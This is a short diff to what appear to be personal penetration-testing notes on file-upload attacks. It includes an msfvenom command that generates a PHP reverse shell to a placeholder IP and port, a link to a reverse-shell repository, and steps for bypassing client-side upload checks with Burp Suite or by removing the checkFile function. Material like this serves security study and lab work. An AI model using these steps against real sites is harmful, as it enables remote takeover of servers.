@@ -11,4 +11,10 @@ PHP Reverse Shell Repository : https://github.com/pentestmonkey/php-reverse-shel
 Generating Custom Reverse Shell : `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`
 
 ## Client Side Validation
-Use Burp Suite, on the front end, ad
+Use Burp Suite, on the front end, add a PNG File and then intercept this request and try to change the filename and add the payload in the body.
+
+![[Pasted image 20250416175605.png]]
+
+We can also remove the checkFile function present in the HTML, that would remove the Client Side Validation.
+
+## Blacklisting Filters
